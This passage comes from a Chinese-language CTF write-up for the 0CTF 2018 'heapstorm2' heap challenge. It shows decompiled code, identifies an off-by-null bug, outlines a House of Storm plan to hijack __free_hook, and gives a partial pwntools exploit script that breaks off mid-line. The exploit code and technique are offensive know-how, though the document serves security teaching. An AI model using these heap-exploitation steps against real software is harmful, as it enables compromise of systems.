delete(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4L</span>L:<br>        a1 = v4;<br>        show(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5L</span>L:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;<br>      <span class="hljs-literal">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同</p>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk">__int64 sub_BE6()<br>{<br>  int i; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">18</span>h]<br>  int fd; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">14</span>h]<br><br>  setvbuf(stdin, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);<br>  alarm(<span class="hljs-number">0</span>x3Cu);<br>  puts(<br>    <span class="hljs-string">"    __ __ _____________   __   __    ___    ____\n"</span><br>    <span class="hljs-string">"   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"</span><br>    <span class="hljs-string">"  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"</span><br>    <span class="hljs-string">" / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"</span><br>    <span class="hljs-string">"/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n"</span>);<br>  puts(<span class="hljs-string">"===== HEAP STORM II ====="</span>);<br>  <span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )                         <span class="hljs-regexp">//</span> 禁用fastbin<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( mmap(<span class="hljs-number">0</span>x13370000, <span class="hljs-number">0</span>x1000uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL) != <span class="hljs-number">322371584</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( read(fd, <span class="hljs-number">0</span>x13370800, <span class="hljs-number">0</span>x18uLL) != <span class="hljs-number">24</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  close(fd);<br>  MEMORY[<span class="hljs-number">0</span>x13370818] = MEMORY[<span class="hljs-number">0</span>x13370810];<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2</span>LL) + <span class="hljs-number">0</span>x13370800) = ptr_xor(<span class="hljs-number">0</span>x13370800, <span class="hljs-number">0</span>LL);<br>    *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2</span>LL) + <span class="hljs-number">0</span>x13370808) = size_xor(<span class="hljs-number">0</span>x13370800LL, <span class="hljs-number">0</span>LL);<br>  }<br>  return <span class="hljs-number">0</span>x13370800LL;<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="ptr-xor"><a href="#ptr-xor" class="headerlink" title="ptr_xor()"></a>ptr_xor()</h4><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall ptr<span class="hljs-constructor">_xor(<span class="hljs-params">_QWORD</span> <span class="hljs-operator">*</span><span class="hljs-params">a1</span>, <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>)</span><br>{<br>  return *a1 ^ a2;     <span class="hljs-comment">//a1为第一个随机数</span><br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="size-xor"><a href="#size-xor" class="headerlink" title="size_xor()"></a>size_xor()</h4><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall size<span class="hljs-constructor">_xor(<span class="hljs-params">__int64</span> <span class="hljs-params">a1</span>, <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>)</span><br>{<br>  return a2 ^ *(a1 + <span class="hljs-number">8</span>);	<span class="hljs-comment">//a1+8为第一个随机数</span><br>}<br></code></pre></td></tr></tbody></table></figure>

<p>readd函数存在一个off-by-one</p>
<figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">unsigned</span> __int64 __fastcall sub_1402(__int64 <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>{<br>  __int64 <span class="hljs-built_in">v3</span><span class="hljs-comment">; // rax</span><br>  char buf<span class="hljs-comment">; // [rsp+17h] [rbp-19h] BYREF</span><br>  unsigned __int64 <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+18h] [rbp-18h]</span><br>  ssize_t <span class="hljs-built_in">v6</span><span class="hljs-comment">; // [rsp+20h] [rbp-10h]</span><br>  unsigned __int64 <span class="hljs-built_in">v7</span><span class="hljs-comment">; // [rsp+28h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">v7</span> = __readfsqword(<span class="hljs-number">0x28</span>u)<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( !<span class="hljs-built_in">a2</span> )<br>    return <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>  <span class="hljs-meta">while</span> ( <span class="hljs-built_in">a2</span> - <span class="hljs-number">1</span> &gt; <span class="hljs-built_in">v5</span> )<br>  {<br>    <span class="hljs-built_in">v6</span> = read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>uLL)<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v6</span> &gt; <span class="hljs-number">0</span> )<br>    {<br>      <span class="hljs-meta">if</span> ( buf == <span class="hljs-number">10</span> )<br>        break<span class="hljs-comment">;</span><br>      <span class="hljs-built_in">v3</span> = <span class="hljs-built_in">v5</span>++<span class="hljs-comment">;</span><br>      *(<span class="hljs-built_in">v3</span> + <span class="hljs-built_in">a1</span>) = buf<span class="hljs-comment">;</span><br>    }<br>    <span class="hljs-meta">else</span> <span class="hljs-meta">if</span> ( *_errno_location() != <span class="hljs-number">11</span> &amp;&amp; *_errno_location() != <span class="hljs-number">4</span> )<br>    {<br>      break<span class="hljs-comment">;</span><br>    }<br>  }<br>  *(<span class="hljs-built_in">a1</span> + <span class="hljs-built_in">v5</span>) = <span class="hljs-number">0</span><span class="hljs-comment">;                               // off-by-null</span><br>  return <span class="hljs-built_in">v5</span><span class="hljs-comment">;</span><br>}<br></code></pre></td></tr></tbody></table></figure>

<p>add函数<br>只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放</p>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> __fastcall <span class="hljs-title">add</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">size_xor</span>(a1, *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2LL</span>) + a1 + <span class="hljs-number">8</span>)) )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>      size = <span class="hljs-built_in">chioce</span>();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">12</span> &amp;&amp; size &lt;= <span class="hljs-number">4096</span> )<br>      {<br>        v3 = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2LL</span>) + a1 + <span class="hljs-number">8</span>) = <span class="hljs-built_in">size_xor</span>(a1, size);<br>        *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2LL</span>) + a1) = <span class="hljs-built_in">ptr_xor</span>(a1, v3);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Chunk %d Allocated\n"</span>, i);<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Size"</span>);<br>      }<br>      <span class="hljs-keyword">return</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="edit函数-1"><a href="#edit函数-1" class="headerlink" title="edit函数"></a>edit函数</h4><p>读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。</p>
<figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __fastcall edit(_QWORD *<span class="hljs-built_in">a1</span>)<br>{<br>  signed int <span class="hljs-built_in">v2</span><span class="hljs-comment">; // [rsp+10h] [rbp-20h]</span><br>  int <span class="hljs-built_in">v3</span><span class="hljs-comment">; // [rsp+14h] [rbp-1Ch]</span><br>  __int64 <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+18h] [rbp-18h]</span><br><br>  printf(<span class="hljs-string">"Index: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v2</span> = chioce()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v2</span> &gt; <span class="hljs-number">0xF</span> <span class="hljs-title">||</span> !size_xor(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a1</span>[<span class="hljs-number">2</span> * <span class="hljs-built_in">v2</span> + <span class="hljs-number">5</span>]) )<br>    return puts(<span class="hljs-string">"Invalid Index"</span>)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Size: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v3</span> = chioce()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v3</span> &lt;= <span class="hljs-number">0</span> <span class="hljs-title">||</span> <span class="hljs-built_in">v3</span> &gt; (size_xor(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a1</span>[<span class="hljs-number">2</span> * <span class="hljs-built_in">v2</span> + <span class="hljs-number">5</span>]) - <span class="hljs-number">12</span>) )<br>    return puts(<span class="hljs-string">"Invalid Size"</span>)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Content: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = ptr_xor(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a1</span>[<span class="hljs-number">2</span> * <span class="hljs-built_in">v2</span> + <span class="hljs-number">4</span>])<span class="hljs-comment">;</span><br>  sub_1377(<span class="hljs-built_in">v4</span>, <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>  strcpy((<span class="hljs-built_in">v3</span> + <span class="hljs-built_in">v4</span>), <span class="hljs-string">"HEAPSTORM_II"</span>)<span class="hljs-comment">;</span><br>  return printf(<span class="hljs-string">"Chunk %d Updated\n"</span>, <span class="hljs-built_in">v2</span>)<span class="hljs-comment">;</span><br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="free函数-1"><a href="#free函数-1" class="headerlink" title="free函数"></a>free函数</h4><p>不存在uaf</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __fastcall sub<span class="hljs-constructor">_109B(<span class="hljs-params">_QWORD</span> <span class="hljs-operator">*</span><span class="hljs-params">a1</span>)</span><br>{<br>  void *v2; <span class="hljs-comment">// rax</span><br>  signed <span class="hljs-built_in">int</span> v3; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  printf(<span class="hljs-string">"Index: "</span>);<br>  v3 = chioce<span class="hljs-literal">()</span>;<br>  <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">0xF</span><span class="hljs-operator"> || </span>!size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v3</span> + 5])</span> )<br>    return puts(<span class="hljs-string">"Invalid Index"</span>);<br>  v2 = ptr<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v3</span> + 4])</span>;<br>  free(v2);<br>  a1<span class="hljs-literal">[<span class="hljs-number">2</span> <span class="hljs-operator">*</span> <span class="hljs-identifier">v3</span> + <span class="hljs-number">4</span>]</span> = ptr<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, 0LL)</span>;<br>  a1<span class="hljs-literal">[<span class="hljs-number">2</span> <span class="hljs-operator">*</span> <span class="hljs-identifier">v3</span> + <span class="hljs-number">5</span>]</span> = size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, 0LL)</span>;<br>  return printf(<span class="hljs-string">"Chunk %d Deleted\n"</span>, v3);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h4><p>需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">	<span class="hljs-built_in">int</span> __fastcall sub<span class="hljs-constructor">_11B5(<span class="hljs-params">_QWORD</span> <span class="hljs-operator">*</span><span class="hljs-params">a1</span>)</span><br>{<br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  signed <span class="hljs-built_in">int</span> v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br><br>  <span class="hljs-keyword">if</span> ( (a1<span class="hljs-literal">[<span class="hljs-number">3</span>]</span> ^ a1<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>) != <span class="hljs-number">0x13377331L</span>L )<br>    return puts(<span class="hljs-string">"Permission denied"</span>);<br>  printf(<span class="hljs-string">"Index: "</span>);<br>  v4 = chioce<span class="hljs-literal">()</span>;<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0xF</span><span class="hljs-operator"> || </span>!size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v4</span> + 5])</span> )<br>    return puts(<span class="hljs-string">"Invalid Index"</span>);<br>  printf(<span class="hljs-string">"Chunk[%d]: "</span>, v4);<br>  v2 = size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v4</span> + 5])</span>;<br>  v3 = ptr<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v4</span> + 4])</span>;<br>  sub<span class="hljs-constructor">_14D4(<span class="hljs-params">v3</span>, <span class="hljs-params">v2</span>)</span>;<br>  return puts(byte_180A);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组</p>
<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>先把前面的东西写好</p>
<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#coding</span>:utf-<span class="hljs-number">8</span><br>from pwn import *<br><span class="hljs-built_in">context</span>(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">'./0ctf_2018_heapstorm2'</span>)<br>libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">'./libc-2.23.so'</span>)<br>#命令简写化<br>s       = lambda data               :sh.<span class="hljs-built_in">send</span>(data)<br>sa      = lambda delim,data         :sh.<span class="hljs-built_in">sendafter</span>(delim,data)<br>sl      = lambda data               :sh.<span class="hljs-built_in">sendline</span>(data)<br>sla     = lambda delim,data         :sh.<span class="hljs-built_in">sendlineafter</span>(delim,data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recv</span>(num)<br>rl      = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recvline</span>(num)<br>ru      = lambda delims   :sh.<span class="hljs-built_in">recvuntil</span>(delims )<br>itr     = lambda                    :sh.<span class="hljs-built_in">interactive</span>()<br>uu32    = lambda data               :<span class="hljs-built_in">u32</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :<span class="hljs-built_in">u64</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>def <span class="hljs-built_in">dbg</span>():<br>    gdb.<span class="hljs-built_in">attach</span>(sh)<br>    <span class="hljs-built_in">pause</span>()<br>def <span class="hljs-built_in">add</span>(size):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'1'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(size))  # <span class="hljs-number">12</span>&lt;size&lt;<span class="hljs-number">0</span>x1000<br><br><br>def <span class="hljs-built_in">edit</span>(idx,content):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'2'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    <span class="hljs-built_in">sa</span>(<span class="hljs-string">'Content: '</span>,content)<br><br><br><br>def <span class="hljs-built_in">free</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'3'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br><br><br>def <span class="hljs-built_in">show</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'4'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br></code></pre></td></tr></tbody></table></figure>

<p>和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个’\x00’，所以我们每次edit都要少输入12字节即可实现0ff-by-null。</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#---------------布置chunk-------------------------#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">0</span>	   <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">2</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">3</span>   <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span>   <br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span>   <br><br><span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">1</span>,'\x00'*<span class="hljs-number">0</span>x4F0+p64(<span class="hljs-number">0</span>x500)) <br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">0</span>,'\x00'*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>))<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">1</span> <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">7</span>   <br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)   <br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>) #<span class="hljs-number">1</span>-<span class="hljs-number">2</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x38)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">2</span>  <br><br><span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">4</span>,'\x00'*<span class="hljs-number">0</span>x4F0+p64(<span class="hljs-number">0</span>x500))<br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">3</span>,'\x00'*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>)) <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">8</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>) #<span class="hljs-number">4</span>-<span class="hljs-number">5</span> <br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x48)#<span class="hljs-number">4</span>  <br><span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8) <br><span class="hljs-attribute">free</span>(<span 